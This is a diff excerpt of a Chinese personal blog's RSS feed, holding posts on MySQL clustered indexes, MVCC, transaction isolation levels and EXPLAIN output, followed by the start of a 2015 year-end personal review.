+      <guid>http://xiaojiong.net/2016/04/15/mysql-%E8%81%9A%E7%B0%87%E7%B4%A2%E5%BC%95/</guid>
+      <description>
+
+&lt;h3 id=&#34;一-什么是聚簇索引&#34;&gt;一、什么是聚簇索引？&lt;/h3&gt;
+
+&lt;p&gt;百科定义：聚簇索引也叫簇类索引，是一种对磁盘上实际数据重新组织以按指定的一个或多个列的值排序。由于聚簇索引的索引页面指针指向数据页面，所以使用聚簇索引查找数据几乎总是比使用非聚簇索引快。每张表只能建一个聚簇索引，并且建聚簇索引需要至少相当该表120%的附加空间，以存放该表的副本和索引中间页。&lt;/p&gt;
+
+&lt;h3 id=&#34;二-特点&#34;&gt;二、特点：&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;聚簇索引确定表中数据的物理顺序&lt;/li&gt;
+&lt;li&gt;一个表只能包含一个聚簇索引&lt;/li&gt;
+&lt;li&gt;聚簇索引对于那些经常要搜索范围值的列特别有效（数据在物理上是顺序的）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;三-组织形式&#34;&gt;三、组织形式&lt;/h3&gt;
+
+&lt;p&gt;聚簇索引是一种数据存储方式，它实际上是在同一个结构中保存了B+树索引和数据行，InnoDB表是按照聚簇索引组织的。InnoDB通过主键聚簇数据，如果没有定义主键，会选择一个唯一的非空索引代替，如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://ww3.sinaimg.cn/large/68faff51jw1f2w8ellxmjj20jc0gnwfg.jpg&#34; alt=&#34;组织结构图&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;四-缺点&#34;&gt;四、缺点&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;插入速度严重依赖于插入顺序，按照主键的顺序插入到数据表中速度是最快的。&lt;/li&gt;
+&lt;li&gt;更新聚簇索引列的代价很高，因为需要移动新的数据。&lt;/li&gt;
+&lt;li&gt;在插入新行，或者主键更新需要移动行的时候，可能导致页分裂，从而导致占用更多的磁盘空间。&lt;/li&gt;
+&lt;li&gt;二级索引（非聚簇）可能比想象的要大，因为二级索引的叶子节点中包含了引用行的主键列。&lt;/li&gt;
+&lt;li&gt;二级索引访问需要2次索引查找，而不是一次，因为二级索引保存的不是行的物理位置，而是主键值。&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>mysql 多版本并发控制协议（MVCC）</title>
+      <link>http://xiaojiong.net/2016/04/13/mysql-%E5%A4%9A%E7%89%88%E6%9C%AC%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AEmvcc/</link>
+      <pubDate>Wed, 13 Apr 2016 05:16:55 +0800</pubDate>
+      
+      <guid>http://xiaojiong.net/2016/04/13/mysql-%E5%A4%9A%E7%89%88%E6%9C%AC%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AEmvcc/</guid>
+      <description>
+
+&lt;h3 id=&#34;一-什么是mvcc&#34;&gt;一、什么是MVCC&lt;/h3&gt;
+
+&lt;p&gt;Multi-Version Concurrency Control 多版本并发控制&lt;/p&gt;
+
+&lt;h3 id=&#34;二-mvcc有什么用&#34;&gt;二、MVCC有什么用？&lt;/h3&gt;
+
+&lt;p&gt;在关系型数据库中行锁与行的多个版本结合起来，只需要很小的开销,就可以实现非锁定读，从而大大提高数据库系统的并发性能&lt;/p&gt;
+
+&lt;h3 id=&#34;三-书上说&#34;&gt;三、书上说&lt;/h3&gt;
+
+&lt;p&gt;高性能mysql第三版：innodb 中每一行有两个隐藏字段。分别为创建版本号和删除版本号，一般用事务ID来进行标识。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;select: 读取创建版本号 &amp;lt;= 当前事务版本号，删除版本号为空或 &amp;gt; 当前事务版本号&lt;/li&gt;
+&lt;li&gt;insert: 保存当前事务版本号作为创建版本号&lt;/li&gt;
+&lt;li&gt;delete: 保存当前事务版本号作为删除版本号&lt;/li&gt;
+&lt;li&gt;update: 插入一条新纪录，保存当前事务版本号作为创建版本号；同时保存当前事务版本号为修改前记录的删除版本号。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;四-深入些&#34;&gt;四、深入些&lt;/h3&gt;
+
+&lt;p&gt;每一行的隐藏字段不是两个而是四个：DATA_TRX_ID，DATA_ROLL_PTR，DB_ROW_ID，DELETE BIT。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;6字节的DATA_TRX_ID 标记了最新更新这条行记录的transaction id，每处理一个事务，其值自动+1&lt;/li&gt;
+&lt;li&gt;7字节的DATA_ROLL_PTR 指向当前记录项的rollback segment的undo log记录，找之前版本的数据就是通过这个指针&lt;/li&gt;
+&lt;li&gt;6字节的DB_ROW_ID，当由innodb自动产生聚集索引时，聚集索引包括这个DB_ROW_ID的值，否则聚集索引中不包括这个值.，这个用于索引当中&lt;/li&gt;
+&lt;li&gt;DELETE BIT位用于标识该记录是否被删除，这里的不是真正的删除数据，而是标志出来的删除。真正意义的删除是在commit的时候&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;在一个sql进行查询时，读取到一行数据的DB_TRX_ID值和自己事物ID的对比，假如隔离级别为MySQL的默认级别，就只读取该ID值小于本身事物ID的数据，其余数据就需要通过DB_ROLL_PTR的信息到回滚段中读取。MVCC是否起到相应的作用需取决于数据库隔离级别的配置。&lt;/p&gt;
+
+&lt;p&gt;在insert和update、delete的操作是有区别的，一个insert语句插入数据再rollback就是直接对undo log的删除，因为他并不会影响其他事物的读取操作，而update、delete操作是在原有数据做更改，可能有其他事物在对该行数据做读取操作，所以update、delete产生的undo log数据是由内部线程自动清理，在该数据无任何事务在使用时清理掉，所以在undo log中insert和update、delete产生的数据存于不同位置。&lt;/p&gt;
+
+&lt;p&gt;上面说了数据的update、delete、insert操作，都会根据主键上的隐藏列来判断和查找，但是二级索引并不存在隐藏列，二级索引就是有索引列和主键列组成的一个小表，这该怎么判断呢？二级索引区别在于假如是一个update操作步骤为：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;标记删除原纪录&lt;/li&gt;
+&lt;li&gt;插入新纪录&lt;/li&gt;
+&lt;li&gt;对应主键做上面的隐藏字段修改，行数据更新，原行数据移入回滚段&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;一个查询语句在利用二级索引进行查找时，发现有个标记删除或者有新数据就会到主键扫描对应的DB_TRX_ID值对比当前事物ID大小，是否利用DB_ROLL_PTR进行读取数据。二级索引的delete、insert也是类似，只是一个没有新纪录，一个没有标记删除记录。&lt;/p&gt;
+
+&lt;h3 id=&#34;五-问题&#34;&gt;五、问题&lt;/h3&gt;
+
+&lt;p&gt;既然知道mysql的每一行中存在记录的版本号，那可不可以通过版本号查询mysql某一行的历史记录呢？&lt;/p&gt;
+
+&lt;p&gt;答案是no,不过oracle有flashback可以实现。我的理解是oracle的undo log做的更出色一些吧。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>mysql的事务隔离级别</title>
+      <link>http://xiaojiong.net/2016/03/30/mysql%E7%9A%84%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB/</link>
+      <pubDate>Wed, 30 Mar 2016 05:10:36 +0800</pubDate>
+      
+      <guid>http://xiaojiong.net/2016/03/30/mysql%E7%9A%84%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB/</guid>
+      <description>
+
+&lt;h3 id=&#34;事务的特性-acid&#34;&gt;事务的特性（ACID）&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;原子性（atomicity）：一个事务（transaction）中的所有操作，要么全部完成，要么全部不完成，不会结束在中间某个环节。事务在执行过程中发生错误，会被回滚（Rollback）到事务开始前的状态，就像这个事务从来没有执行过一样。&lt;/li&gt;
+&lt;li&gt;一致性（consistency）：在事务开始之前和事务结束以后，数据库的完整性没有被破坏。这表示写入的资料必须完全符合所有的预设规则，这包含资料的精确度、串联性以及后续数据库可以自发性地完成预定的工作。&lt;/li&gt;
+&lt;li&gt;隔离性（isolation）：当两个或者多个事务并发访问（此处访问指查询和修改的操作）数据库的同一数据时所表现出的相互关系。事务隔离分为不同级别，包括读未提交（Read uncommitted）、读提交（read committed）、可重复读（repeatable read）和串行化（Serializable）。&lt;/li&gt;
+&lt;li&gt;持久性（durability）：在事务完成以后，该事务对数据库所作的更改便持久地保存在数据库之中，并且是完全的。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;事务的隔离级别-isolation-level&#34;&gt;事务的隔离级别（Isolation Level）&lt;/h3&gt;
+
+&lt;p&gt;为解决脏读、幻读、不可重复读，引入如下4种事务隔离级别：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;读未提交（Read Uncommitted）&lt;/li&gt;
+&lt;li&gt;读已提交（Read Committed）&lt;/li&gt;
+&lt;li&gt;可重复读（Repeatabel Read）&lt;/li&gt;
+&lt;li&gt;串行化读（Serializable）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;隔离级别&lt;/th&gt;
+&lt;th&gt;脏读&lt;/th&gt;
+&lt;th&gt;不可重复读&lt;/th&gt;
+&lt;th&gt;幻读&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;读未提交（基本不用）&lt;/td&gt;
+&lt;td&gt;允许&lt;/td&gt;
+&lt;td&gt;允许&lt;/td&gt;
+&lt;td&gt;允许&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;读已提交&lt;/td&gt;
+&lt;td&gt;不允许&lt;/td&gt;
+&lt;td&gt;允许&lt;/td&gt;
+&lt;td&gt;允许&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;可重复读（默认）&lt;/td&gt;
+&lt;td&gt;不允许&lt;/td&gt;
+&lt;td&gt;不允许&lt;/td&gt;
+&lt;td&gt;不允许&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;串行化读（基本不用）&lt;/td&gt;
+&lt;td&gt;不允许&lt;/td&gt;
+&lt;td&gt;不允许&lt;/td&gt;
+&lt;td&gt;不允许&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;ul&gt;
+&lt;li&gt;脏读（dirty read）：一个事务读取到了另一个事务未提交的数据操作结果。&lt;/li&gt;
+&lt;li&gt;不可重复读（unrepeatable read）：事务T1读取某一数据，事务T2读取并修改了该数据，T1为了对读取值进行检验而再次读取该数据，便得到了不同的结果。&lt;/li&gt;
+&lt;li&gt;幻读（phantom read）：幻读是指当事务不是独立执行时发生的一种现象，例如第一个事务对一个表中的数据进行了修改，比如这种修改涉及到表中的“全部数据行”。同时，第二个事务也修改这个表中的数据，这种修改是向表中插入“一行新数据”。那么，以后就会发生操作第一个事务的用户发现表中还有没有修改的数据行，就好象发生了幻觉一样。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;update影响不可重复读;insert或delete影响幻读&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;注意&#34;&gt;注意&lt;/h3&gt;
+
+&lt;p&gt;Repeatabel Read在其他数据库中并不能解决幻读问题，mysql/InnoDB通过Next-Key Lock机制实现。不过mysql并不能完全保证幻读，需要自己手动加锁实现。&lt;/p&gt;
+
+&lt;p&gt;举例：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; show create table rr\G;
+*************************** 1. row ***************************
+       Table: rr
+Create Table: CREATE TABLE `rr` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `value` varchar(30) DEFAULT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8
+1 row in set (0.00 sec)
+//查看当前隔离级别
+mysql&amp;gt; select @@tx_isolation;
++-----------------+
+| @@tx_isolation  |
++-----------------+
+| REPEATABLE-READ |
++-----------------+
+1 row in set (0.00 sec)
+//开始实验
+session1                                session2
+begin;                                    begin;
+select * from rr;
+Empty set (0.00 sec)
+                                        insert into rr values(1, &#39;haha&#39;);
+select * from rr;
+Empty set (0.00 sec)
+                                        commit;
+select * from rr;
+Empty set (0.00 sec)
+
+insert into rr values(1, &#39;haha&#39;);
+ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;PRIMARY&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;幻读出现，MySQL InnoDB的可重复读并不保证避免幻读，需要应用使用加锁读来保证。而这个加锁度使用到的机制就是next-key locks。不过不建议使用加锁实现，会有性能问题。应该从应用层设计方面改善。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>mysql Explain 详解</title>
+      <link>http://xiaojiong.net/2016/03/12/mysql-explain-%E8%AF%A6%E8%A7%A3/</link>
+      <pubDate>Sat, 12 Mar 2016 04:51:22 +0800</pubDate>
+      
+      <guid>http://xiaojiong.net/2016/03/12/mysql-explain-%E8%AF%A6%E8%A7%A3/</guid>
+      <description>
+
+&lt;p&gt;&lt;a href=&#34;https://launchpad.net/test-db/employees-db-1/1.0.6/+download/employees_db-full-1.0.6.tar.bz2&#34;&gt;示例数据库下载地址&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;示例查询：&lt;/p&gt;
+
+&lt;p&gt;query1：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; EXPLAIN SELECT * FROM employees\G;
+*************************** 1. row ***************************
+           id: 1
+  select_type: SIMPLE
+        table: employees
+         type: ALL
+possible_keys: NULL
+          key: NULL
+      key_len: NULL
+          ref: NULL
+         rows: 299512
+        Extra: NULL
+1 row in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;query2:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; EXPLAIN SELECT (SELECT emp_no FROM salaries LIMIT 1) FROM employees\G;
+*************************** 1. row ***************************
+           id: 1
+  select_type: PRIMARY
+        table: employees
+         type: index
+possible_keys: NULL
+          key: first_name_last_name
+      key_len: 94
+          ref: NULL
+         rows: 299512
+        Extra: Using index
+*************************** 2. row ***************************
+           id: 2
+  select_type: SUBQUERY
+        table: salaries
+         type: index
+possible_keys: NULL
+          key: emp_no
+      key_len: 4
+          ref: NULL
+         rows: 2838426
+        Extra: Using index
+2 rows in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;query3:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; EXPLAIN SELECT * FROM (SELECT emp_no FROM salaries) AS b\G;
+*************************** 1. row ***************************
+           id: 1
+  select_type: PRIMARY
+        table: &amp;lt;derived2&amp;gt;
+         type: ALL
+possible_keys: NULL
+          key: NULL
+      key_len: NULL
+          ref: NULL
+         rows: 2838426
+        Extra: NULL
+*************************** 2. row ***************************
+           id: 2
+  select_type: DERIVED
+        table: salaries
+         type: index
+possible_keys: NULL
+          key: emp_no
+      key_len: 4
+          ref: NULL
+         rows: 2838426
+        Extra: Using index
+2 rows in set (0.01 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;query4:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; EXPLAIN SELECT 1 UNION ALL SELECT 1\G;
+*************************** 1. row ***************************
+           id: 1
+  select_type: PRIMARY
+        table: NULL
+         type: NULL
+possible_keys: NULL
+          key: NULL
+      key_len: NULL
+          ref: NULL
+         rows: NULL
+        Extra: No tables used
+*************************** 2. row ***************************
+           id: 2
+  select_type: UNION
+        table: NULL
+         type: NULL
+possible_keys: NULL
+          key: NULL
+      key_len: NULL
+          ref: NULL
+         rows: NULL
+        Extra: No tables used
+*************************** 3. row ***************************
+           id: NULL
+  select_type: UNION RESULT
+        table: &amp;lt;union1,2&amp;gt;
+         type: ALL
+possible_keys: NULL
+          key: NULL
+      key_len: NULL
+          ref: NULL
+         rows: NULL
+        Extra: Using temporary
+3 rows in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;一-id&#34;&gt;一、id&lt;/h3&gt;
+
+&lt;p&gt;标识select所属于的行&lt;/p&gt;
+
+&lt;h3 id=&#34;二-select-type&#34;&gt;二、select_type&lt;/h3&gt;
+
+&lt;p&gt;标识是简单查询还是复杂查询
+简单(SIMPLE)：不包括子查询和UNION。如&lt;strong&gt;query1&lt;/strong&gt;
+复杂：最外层部分为PRIMARY,其余部分如下：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;SUBQUERY：包括在SELECT中，不在FROM子句中。如&lt;strong&gt;query2&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;DERIVED：表示包含在FROM中的SELECT中。如&lt;strong&gt;query3&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;UNION：UNION中的第二个和随后的SELECT，如果UNION中的第一个SELECT被FROM包含，那么第一个为DERIVED。如&lt;strong&gt;query4&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;UNION RESULT：UNION匿名临时表检索结果的SELECT。如query4 ps：UNION总是将结果存放在匿名临时表中，之后MYSQL将结果读取到临时表外。临时表并不在原sql中出现，因此id为NULL。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;三-table&#34;&gt;三、table&lt;/h3&gt;
+
+&lt;p&gt;显示访问哪个表，join的时候左侧深度优先树。&lt;/p&gt;
+
+&lt;p&gt;示例：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; EXPLAIN SELECT emp_no FROM employees INNER JOIN dept_emp USING (emp_no) INNER JOIN departments USING (dept_no)\G;
+*************************** 1. row ***************************
+           id: 1
+  select_type: SIMPLE
+        table: departments
+         type: index
+possible_keys: PRIMARY
+          key: dept_name
+      key_len: 122
+          ref: NULL
+         rows: 9
+        Extra: Using index
+*************************** 2. row ***************************
+           id: 1
+  select_type: SIMPLE
+        table: dept_emp
+         type: ref
+possible_keys: PRIMARY,emp_no,dept_no
+          key: dept_no
+      key_len: 12
+          ref: employees.departments.dept_no
+         rows: 1
+        Extra: Using index
+*************************** 3. row ***************************
+           id: 1
+  select_type: SIMPLE
+        table: employees
+         type: eq_ref
+possible_keys: PRIMARY
+          key: PRIMARY
+      key_len: 4
+          ref: employees.dept_emp.emp_no
+         rows: 1
+        Extra: Using index
+3 rows in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;当在FROM子句中有子查询时，TABLE列是&lt;derivedN&gt;形式，其中N是子查询id。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; EXPLAIN SELECT * FROM (SELECT emp_no FROM (SELECT * FROM employees ) AS a) AS b\G;
+*************************** 1. row ***************************
+           id: 1
+  select_type: PRIMARY
+        table: &amp;lt;derived2&amp;gt;
+         type: ALL
+possible_keys: NULL
+          key: NULL
+      key_len: NULL
+          ref: NULL
+         rows: 299512
+        Extra: NULL
+*************************** 2. row ***************************
+           id: 2
+  select_type: DERIVED
+        table: &amp;lt;derived3&amp;gt;
+         type: ALL
+possible_keys: NULL
+          key: NULL
+      key_len: NULL
+          ref: NULL
+         rows: 299512
+        Extra: NULL
+*************************** 3. row ***************************
+           id: 3
+  select_type: DERIVED
+        table: employees
+         type: ALL
+possible_keys: NULL
+          key: NULL
+      key_len: NULL
+          ref: NULL
+         rows: 299512
+        Extra: NULL
+3 rows in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;注意：MySQL对待这些表和普通表一样，但是这些“临时表”是没有任何索引的&lt;/p&gt;
+
+&lt;h3 id=&#34;四-type&#34;&gt;四、type&lt;/h3&gt;
+
+&lt;p&gt;关联类型（访问类型）&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;ALL：全表扫描&lt;/li&gt;
+&lt;li&gt;index：与全表扫描一样，只是Mysql扫描表时按索引次序进行而不是行。优点：避免了排序。缺点：按索引次序读取整个表的开销。Extra：Using index，说明Mysql正在使用覆盖索引，只扫描索引的数据，而不是索引次序的每一行。&lt;/li&gt;
+&lt;li&gt;range：范围扫描是一个有限的索引扫描。例如：Between, where：&amp;gt;, IN, OR。&lt;/li&gt;
+&lt;li&gt;ref：索引查找，非唯一索引和唯一索引前缀。ref_or_null是ref上的一个变体，它意味着MySQL必须在初次查找结果进行一次查找以找出NULL记录。&lt;/li&gt;
+&lt;li&gt;eq_ref：是多返回一条符合条件的记录。&lt;/li&gt;
+&lt;li&gt;const：where （主键=$num） 方式。&lt;/li&gt;
+&lt;li&gt;NULL：优化阶段分解查询语句。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;五-possible-key列&#34;&gt;五、possible_key列&lt;/h3&gt;
+
+&lt;p&gt;MySQL能使用哪些索引&lt;/p&gt;
+
+&lt;h3 id=&#34;六-key&#34;&gt;六、key&lt;/h3&gt;
+
+&lt;p&gt;mysql具体使用哪个索引&lt;/p&gt;
+
+&lt;h3 id=&#34;七-key-len&#34;&gt;七、key_len&lt;/h3&gt;
+
+&lt;p&gt;索引使用的字节数&lt;/p&gt;
+
+&lt;p&gt;k计算公式：&lt;/p&gt;
+
+&lt;p&gt;L：索引列所定义字段类型字符长度&lt;/p&gt;
+
+&lt;p&gt;C：不同编码下一个字符所占的字节数（如utf8=3，gbk=2）&lt;/p&gt;
+
+&lt;p&gt;N：字段为空标记，占1字节（非空字段此标记不占用字节）&lt;/p&gt;
+
+&lt;p&gt;S：索引列字段是否定长（int、char、datetime为定长，varchar为不定长），不定长字段类型需记录长度信息，占2字节&lt;/p&gt;
+
+&lt;p&gt;key_len = L*C[+N][+S]&lt;/p&gt;
+
+&lt;p&gt;举例：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;CREATE TABLE `dept_emp` (
+  `emp_no` int(11) NOT NULL,
+  `dept_no` char(4) NOT NULL,
+  `from_date` date NOT NULL,
+  `to_date` date NOT NULL,
+  PRIMARY KEY (`emp_no`,`dept_no`),
+  KEY `emp_no` (`emp_no`),
+  KEY `dept_no` (`dept_no`),
+  CONSTRAINT `dept_emp_ibfk_1` FOREIGN KEY (`emp_no`) REFERENCES `employees` (`emp_no`) ON DELETE CASCADE,
+  CONSTRAINT `dept_emp_ibfk_2` FOREIGN KEY (`dept_no`) REFERENCES `departments` (`dept_no`) ON DELETE CASCADE
+) ENGINE=InnoDB DEFAULT CHARSET=utf8
+
+mysql&amp;gt; EXPLAIN SELECT * FROM dept_emp WHERE dept_no = &#39;d007&#39;\G;
+*************************** 1. row ***************************
+           id: 1
+  select_type: SIMPLE
+        table: dept_emp
+         type: ref
+possible_keys: dept_no
+          key: dept_no
+      key_len: 12
+          ref: const
+         rows: 93330
+        Extra: Using index condition
+1 row in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;计算方法：4*3 = 12&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;CREATE TABLE `employees` (
+  `emp_no` int(11) NOT NULL,
+  `birth_date` date NOT NULL,
+  `first_name` varchar(14) NOT NULL,
+  `last_name` varchar(16) DEFAULT NULL,
+  `gender` enum(&#39;M&#39;,&#39;F&#39;) NOT NULL,
+  `hire_date` date NOT NULL,
+  PRIMARY KEY (`emp_no`),
+  KEY `first_name_last_name` (`first_name`,`last_name`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8
+
+mysql&amp;gt; EXPLAIN SELECT * FROM employees WHERE first_name = &#39;Tomofumi&#39; AND last_name = &#39;Asmuth&#39;\G;
+*************************** 1. row ***************************
+           id: 1
+  select_type: SIMPLE
+        table: employees
+         type: ref
+possible_keys: first_name_last_name
+          key: first_name_last_name
+      key_len: 95
+          ref: const,const
+         rows: 1
+        Extra: Using index condition
+1 row in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;计算方法：(14+16)*3 + 1 + 2*2 = 95&lt;/p&gt;
+
+&lt;h3 id=&#34;八-ref&#34;&gt;八、ref&lt;/h3&gt;
+
+&lt;p&gt;之前在key列记录的索引中查找值所用的列或常量&lt;/p&gt;
+
+&lt;h3 id=&#34;九-row&#34;&gt;九、row&lt;/h3&gt;
+
+&lt;p&gt;MySQL为了查找所需的行而要读取的行数。无法反应limit，不代表结果集。&lt;/p&gt;
+
+&lt;h3 id=&#34;十-extra&#34;&gt;十、Extra&lt;/h3&gt;
+
+&lt;p&gt;额外信息&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Using index：使用覆盖索引。&lt;/li&gt;
+&lt;li&gt;Using where：MySQL将存储引擎返回服务层以后再应用where条件过滤。&lt;/li&gt;
+&lt;li&gt;Using temporary：对查询结果排序时会使用一个临时表。&lt;/li&gt;
+&lt;li&gt;Using filesort：MySQL会对结果使用外部索引排序。&lt;/li&gt;
+&lt;li&gt;Using Index condition：5.6新特性，可以进行索引筛选。&lt;a href=&#34;http://www.xiaojiong.net/2016/02/18/mysql-Index-Condition-Pushdown/&#34;&gt;详情&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Not exists：MySQL优化了left_join，一旦它找到了left join标准的行，就不再搜索了。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;注意&#34;&gt;注意&lt;/h3&gt;
+
+&lt;p&gt;mysql5.6以后支持非select语句。&lt;/p&gt;
+
+&lt;h3 id=&#34;参考资料&#34;&gt;参考资料&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.oreilly.com.cn/index.php?func=book&amp;amp;isbn=978-7-121-19885-4&#34;&gt;高性能MYSQL(第三版)&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>2015年年终总结</title>
+      <link>http://xiaojiong.net/2016/02/26/2015%E5%B9%B4%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
+      <pubDate>Fri, 26 Feb 2016 18:59:43 +0800</pubDate>
+      
+      <guid>http://xiaojiong.net/2016/02/26/2015%E5%B9%B4%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
+      <description>
+
+&lt;h3 id=&#34;伤病&#34;&gt;伤病&lt;/h3&gt;
+
+&lt;p&gt;年初的脚受伤，让我知道了自己再也不是那个20出头的毛小伙，不能对自己的身体太任性了。也知道了看病难。一度对自己坚持锻炼身体，产生了怀疑。以为这辈子再也没办法打篮球了，好在时间治愈了一切，无论是生理上的，还是心理上的。&lt;/p&gt;
+
+&lt;p&gt;总结：对自己别太苛刻，不勉强。循序渐进，俗语说的好：哪能一口吃出来一个胖子。做什么事情都有困难，坚持自己的选择。&lt;/p&gt;
+
+&lt;h3 id=&#34;工作&#34;&gt;工作&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;技术：有充足的时间做一些自己想做的事情。&lt;/li&gt;
+&lt;li&gt;沟通：沟通能力有了很大的提升，沟通是门艺术。持续的修炼中。。。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;总结：技术上希望今年有较大的提升，见识一下传说中的大流量是什么样子的。希望高强度、高压力的工作能给自己带来快速的成长。&lt;/p&gt;
+
+&lt;h3 id=&#34;自我驱动能力&#34;&gt;自我驱动能力&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;学习：从毕业起坚持每天看书。一直在坚持，已然成为生活的一部分。大部分是技术书籍，个别文学与历史的书，调节一下。&lt;/li&gt;
+&lt;li&gt;身体：自从毕业第一年，加班累出来颈椎病以后。切身处地的理解身体是革命的本钱这句话。因为脚受伤，没办法跑步和打篮球，改为健身。体型变化还是蛮大的（六块腹肌是有的~）。锻炼身体也是磨练自己意志品质的好方式。&lt;/li&gt;
+&lt;li&gt;精神：感觉跟毕业没啥区别，我大双子各种分裂人格，根本停不下来。开始变得更矫情，开始喜欢一些有故事的歌，开始做一些以前只是嘴上说说而已的事情。&lt;/li&gt;
+&lt;li&gt;戒烟：抽了那么多年的烟，说戒就戒了，朋友都觉得我是因为什么人或者什么事受刺激了。只有我自己知道，想戒就戒了。戒烟一年多，身体上的好处数不胜数，最意外的变化是戒烟以后头脑变的更清晰了，记忆力更好了（有科学依据的）。对学习帮助挺大的，这个变化属于意外的收获。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;总结：从毕业到现在对自己最满意的就是自我驱动能力。坚持不懈的从小事做起，时间是成长的最好见证者。&lt;/p&gt;
+
+&lt;h3 id=&#34;爱好&#34;&gt;爱好&lt;/h3&gt;
+
+&lt;p&gt;电影：&lt;/p&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;名称&lt;/th&gt;
+&lt;th align=&#34;right&#34;&gt;评分（5分满分）&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;短评&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;盗梦空间（review）&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;小李子演技真的可以的&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;三傻大闹宝莱坞&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
